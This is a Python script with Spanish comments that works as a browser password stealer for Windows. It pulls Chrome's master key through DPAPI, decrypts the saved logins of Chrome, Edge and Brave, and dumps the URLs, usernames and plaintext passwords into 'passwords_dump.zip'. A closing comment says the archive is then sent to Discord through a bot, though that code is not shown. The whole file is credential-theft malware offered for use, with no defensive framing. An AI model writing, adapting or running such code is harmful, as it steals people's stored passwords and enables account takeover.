import os
import sqlite3
import win32crypt
import base64
import json
from Crypto.Cipher import AES

# Función para desencriptar contraseñas en navegadores Chrome, Brave y Edge
def decrypt_password(encrypted_password, encryption_key):
    try:
        # La clave de cifrado AES para Chrome/Brave/Edge está en la forma de un objeto "AES"
        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=encrypted_password[:12])
        decrypted_password = cipher.decrypt_and_verify(encrypted_password[12:], encrypted_password[-16:])
        return decrypted_password.decode()
    except Exception as e:
        print(f"Error al desencriptar: {e}")
        return None

# Obtener la clave de cifrado de Windows
def get_encryption_key():
    local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encryption_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(encryption_key[5:], None, None, None, 0)[1]

# Función para leer la base de datos SQLite de los navegadores y obtener contraseñas desencriptadas
def get_browser_passwords(browser_path):
    encryption_key = get_encryption_key()
    db_path = os.path.join(browser_path, "Login Data")  # Chrome, Brave, Edge usan Login Data

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")

    passwords = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[2]
        encrypted_password = row[3]

        password = decrypt_password(encrypted_password, encryption_key)
        if password:
            passwords.append({"url": url, "username": username, "password": password})
    
    conn.close()
    return passwords

# Función para crear el archivo ZIP con las contraseñas desencriptadas
def create_zip_with_passwords(browser_paths, zip_name="passwords_dump.zip"):
    import zipfile
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for browser, path in browser_paths.items():
            passwords = get_browser_passwords(path)
            if passwords:
                file_name = f"{browser}_passwords.json"
                with open(file_name, "w") as f:
                    json.dump(passwords, f, indent=4)
                zipf.write(file_name)
                os.remove(file_name)  # Eliminar archivo temporal después de agregarlo al ZIP
    print(f"Archivo ZIP creado: {zip_name}")
    return zip_name

# Ruta a las carpetas de los navegadores
browser_paths = {
    "chrome": os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
    "edge": os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default"),
    "brave": os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default")
}

# Crear archivo ZIP con contraseñas desencriptadas
zip_path = create_zip_with_passwords(browser_paths)

# Código para enviar el archivo ZIP a Discord sigue igual (usando el bot)
